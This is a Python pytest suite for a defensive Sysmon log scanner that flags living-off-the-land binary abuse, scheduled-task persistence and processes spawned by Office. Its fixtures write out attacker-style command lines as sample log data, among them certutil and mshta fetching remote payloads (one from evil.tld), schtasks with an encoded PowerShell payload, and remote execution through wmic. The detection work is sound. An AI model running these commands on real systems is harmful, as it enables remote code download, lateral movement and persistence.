"""test_lolbin_scan — triase Sysmon XML EID 1/11 utk LOLBin abuse,
persistence scheduled task, office-spawn (#0428 #0429 #0431), nol
jaringan. Ranah EID 8/10/25/dump-cmdline sengaja TIDAK disentuh (tool
sysmon_triage B16); diuji di sini bahwa EID tsb diabaikan.
"""
from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path

TOOLS = Path(__file__).resolve().parents[1] / "tools"
sys.path.insert(0, str(TOOLS))

import lolbin_scan as lbs  # noqa: E402

BS = chr(92)


def _ev(eid: int, **data: str) -> str:
    t = data.pop("time", "2026-03-18T01:00:00.000Z")
    host = data.pop("host", "PC-01.corp.local")
    body = "".join(
        f'<Data Name="{k}">{v}</Data>' for k, v in data.items())
    return (f'<Event xmlns="http://schemas.microsoft.com/win/2004/'
            f'windows/events/log"><System><EventID>{eid}</EventID>'
            f'<TimeCreated SystemTime="{t}"/>'
            f'<Computer>{host}</Computer></System>'
            f'<EventData>{body}</EventData></Event>')


def _file(tmp_path: Path, *events: str) -> Path:
    p = tmp_path / "sysmon.xml"
    p.write_text("<Events>" + "".join(events) + "</Events>",
                 encoding="utf-8")
    return p


def _run(*args: str) -> tuple[int, dict | None, str]:
    proc = subprocess.run(
        [sys.executable, str(TOOLS / "lolbin_scan.py"), *args],
        capture_output=True, text=True)
    out = json.loads(proc.stdout) if proc.stdout.strip() else None
    return proc.returncode, out, proc.stderr


def _p1(image: str, cmdline: str, parent: str = "explorer.exe",
        guid: str = "", t: str = "2026-03-18T01:00:00.000Z") -> str:
    return _ev(1, time=t, Image=image, CommandLine=cmdline,
               ParentImage=parent, ProcessGuid=guid)


# ------------------------------------------------------- parsing
def test_relevant_and_irrelevant_eids(tmp_path):
    evs = (
        _ev(1, Image="C:" + BS + "Windows" + BS + "notepad.exe",
            CommandLine="notepad.exe"),
        _ev(8, SourceImage="a.exe", TargetImage="b.exe"),      # B16 ranah
        _ev(10, TargetImage="lsass.exe", GrantedAccess="0x1010"),
        _ev(25, Image="svchost.exe", Type="image changed"),
        _ev(4688, NewProcessName="x.exe"),
    )
    rc, out, _ = _run("--log", str(_file(tmp_path, *evs)))
    assert rc == 0
    assert out["stats"]["eid_1"] == 1
    assert out["stats"]["eid_11"] == 0
    assert out["findings"] == []
    assert any("task-xml" in n for n in out["notes"])


def test_no_relevant_events_fails_closed(tmp_path):
    p = _file(tmp_path, _ev(999, Image="x.exe"))
    rc, out, err = _run("--log", str(p))
    assert rc == 2 and out is None and "nol event" in err


def test_bad_xml_fails_closed(tmp_path):
    p = tmp_path / "x.xml"
    p.write_text("<Events><Event><Data", encoding="utf-8")
    rc, out, err = _run("--log", str(p))
    assert rc == 2 and "XML tidak valid" in err


# ------------------------------------------------------- LOLBin cmdline
def test_certutil_urlcache_high(tmp_path):
    ev = _p1("C:" + BS + "Windows" + BS + "certutil.exe",
             "certutil.exe -urlcache -split -f "
             "http://10.0.0.9/x.ps1 x.ps1")
    rc, out, _ = _run("--log", str(_file(tmp_path, ev)))
    hits = [f for f in out["findings"] if f["check"] ==
            "certutil-download"]
    assert rc == 0 and len(hits) == 1 and hits[0]["severity"] == "high"


def test_mshta_http_and_unc(tmp_path):
    evs = (
        _p1("C:" + BS + "mshta.exe", "mshta.exe http://evil.tld/a.hta"),
        _p1("C:" + BS + "mshta.exe",
            "mshta.exe " + BS + BS + "srv" + BS + "share" + BS + "a.hta"),
    )
    rc, out, _ = _run("--log", str(_file(tmp_path, *evs)))
    hits = [f for f in out["findings"] if f["check"] == "mshta-remote"]
    assert len(hits) == 2


def test_schtasks_payload_and_remote(tmp_path):
    evs = (
        _p1("C:" + BS + "schtasks.exe",
            "schtasks.exe /create /tn Upd /tr "
            "'powershell -enc SQBFAFgA' /sc onlogon"),
        _p1("C:" + BS + "schtasks.exe",
            "schtasks.exe /create /s " + BS + BS + "SRV-02 /tn job "
            "/tr cmd.exe", t="2026-03-18T01:01:00.000Z"),
        # schtasks sah lokal tanpa payload -> tidak ditandai
        _p1("C:" + BS + "schtasks.exe",
            "schtasks.exe /create /tn cleanup /tr clean.bat /sc daily",
            t="2026-03-18T01:02:00.000Z"),
    )
    rc, out, _ = _run("--log", str(_file(tmp_path, *evs)))
    checks = [f["check"] for f in out["findings"]]
    assert "schtasks-payload" in checks
    assert "schtasks-remote" in checks
    assert len([c for c in checks if c.startswith("schtasks")]) == 2


def test_wmic_remote_exec(tmp_path):
    ev = _p1("C:" + BS + "wmic.exe",
             "wmic.exe /node:SRV-05 process call create cmd.exe")
    rc, out, _ = _run("--log", str(_file(tmp_path, ev)))
    checks = [f["check"] for f in out["findings"]]
    assert "wmic-remote-exec" in checks


def test_legit_cmdline_not_flagged(tmp_path):
    # LOLBin dipakai sah (argumen normal) -> NOL temuan
    evs = (
        _p1("C:" + BS + "certutil.exe",
            "certutil.exe -hashfile report.bin SHA256"),
        _p1("C:" + BS + "bitsadmin.exe",
            "bitsadmin.exe /list"),
        _p1("C:" + BS + "powershell.exe",
            "powershell.exe -command Get-Process"),
    )
    rc, out, _ = _run("--log", str(_file(tmp_path, *evs)))
    assert rc == 0 and out["findings"] == []


def test_ps_encoded_and_hidden(tmp_path):
    evs = (
        _p1("C:" + BS + "powershell.exe",
            "powershell.exe -nop -enc SQBFAFgA"),
        _p1("C:" + BS + "powershell.exe",
            "powershell.exe -w hidden -command Get-Date",
            t="2026-03-18T01:01:00.000Z"),
    )
    rc, out, _ = _run("--log", str(_file(tmp_path, *evs)))
    checks = [f["check"] for f in out["findings"]]
    assert "ps-encoded" in checks and "ps-hidden" in checks


# ------------------------------------------------------- office-spawn
def test_office_spawn_high(tmp_path):
    ev = _p1("C:" + BS + "cmd.exe", "cmd.exe /c whoami",
             parent="C:" + BS + "Program Files" + BS +
                    "Microsoft Office" + BS + "WINWORD.EXE")
    rc, out, _ = _run("--log", str(_file(tmp_path, ev)))
    hits = [f for f in out["findings"] if f["check"] == "office-spawn"]
    assert len(hits) == 1 and hits[0]["severity"] == "high"
    assert hits[0]["proc"] == "cmd.exe"


def test_office_spawn_allow_parent(tmp_path):
    ev = _p1("C:" + BS + "cmd.exe", "cmd.exe /c make.exe",
             parent="C:" + BS + "WINWORD.EXE")
    p = _file(tmp_path, ev)
    rc, out, _ = _run("--log", str(p), "--allow-parent", "winword.exe")
    assert [f for f in out["findings"]
            if f["check"] == "office-spawn"] == []
    assert any("parent sah" in n for n in out["notes"])


def test_explorer_parent_not_flagged(tmp_path):
    ev = _p1("C:" + BS + "powershell.exe",
             "powershell.exe -command Get-ChildItem")
    rc, out, _ = _run("--log", str(_file(tmp_path, ev)))
    assert [f for f in out["findings"]
            if f["check"] == "office-spawn"] == []


# ------------------------------------------------------- task XML
def test_task_xml_write_with_creator(tmp_path):
    guid = "{11111111-2222-3333-4444-000000000001}"
    evs = (
        _p1("C:" + BS + "powershell.exe",
            "powershell.exe -enc SQBFAFgA", guid=guid,
            t="2026-03-18T01:00:00.000Z"),
        _ev(11, time="2026-03-18T01:00:01.000Z",
            Image="C:" + BS + "powershell.exe", ProcessGuid=guid,
            TargetFilename="C:" + BS + "Windows" + BS + "System32" + BS +
                          "Tasks" + BS + "UpdCheck"),
    )
    rc, out, _ = _run("--log", str(_file(tmp_path, *evs)))
    hits = [f for f in out["findings"] if f["check"] == "task-xml-write"]
    assert len(hits) == 1 and hits[0]["severity"] == "high"
    assert "creator" in hits[0]["detail"]


def test_task_xml_write_without_creator(tmp_path):
    ev = _ev(11, Image="C:" + BS + "svchost.exe",
             ProcessGuid="{aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee}",
             TargetFilename="C:" + BS + "Windows" + BS + "System32" + BS +
                           "Tasks" + BS + "SomeTask")
    rc, out, _ = _run("--log", str(_file(tmp_path, ev)))
    hits = [f for f in out["findings"] if f["check"] == "task-xml-write"]
    assert len(hits) == 1 and hits[0]["severity"] == "medium"
    assert "tidak ada di log EID 1" in hits[0]["detail"]


def test_task_xml_outside_tasks_dir_ignored(tmp_path):
    ev = _ev(11, Image="C:" + BS + "proc.exe",
             ProcessGuid="{aaaaaaaa-bbbb-cccc-dddd-000000000001}",
             TargetFilename="C:" + BS + "Users" + BS + "a" + BS +
                            "file.xml")
    rc, out, _ = _run("--log", str(_file(tmp_path, ev)))
    assert out["findings"] == []


# ------------------------------------------------------- allowlist path
def test_allow_path_filters_and_notes(tmp_path):
    ev = _p1("C:" + BS + "tools" + BS + "certutil.exe",
             "certutil.exe -urlcache -split -f http://10.0.0.9/x x")
    p = _file(tmp_path, ev)
    rc, out, _ = _run("--log", str(p),
                      "--allow-path", "C:" + BS + "tools" + BS)
    assert out["findings"] == []
    assert any("path biner sah" in n for n in out["notes"])
    rc, out, _ = _run("--log", str(p))
    assert len(out["findings"]) == 1  # tanpa allowlist tetap terdeteksi


# ------------------------------------------------------- umum
def test_deterministic_output(tmp_path):
    evs = (
        _p1("C:" + BS + "mshta.exe", "mshta.exe http://a/x.hta"),
        _p1("C:" + BS + "certutil.exe",
            "certutil.exe -urlcache -f http://b/y y",
            t="2026-03-18T01:01:00.000Z"),
    )
    p = _file(tmp_path, *evs)
    _, out1, _ = _run("--log", str(p))
    _, out2, _ = _run("--log", str(p))
    assert json.dumps(out1) == json.dumps(out2)
    checks = [f["check"] for f in out1["findings"]]
    assert checks == sorted(checks) or len(checks) == 2


def test_out_file_written(tmp_path):
    ev = _p1("C:" + BS + "mshta.exe", "mshta.exe http://a/x.hta")
    p = _file(tmp_path, ev)
    outp = tmp_path / "t.json"
    rc, _, _ = _run("--log", str(p), "--out", str(outp))
    assert rc == 0 and outp.is_file()
    assert json.loads(outp.read_text(encoding="utf-8"))["schema"] == \
        lbs.SCHEMA
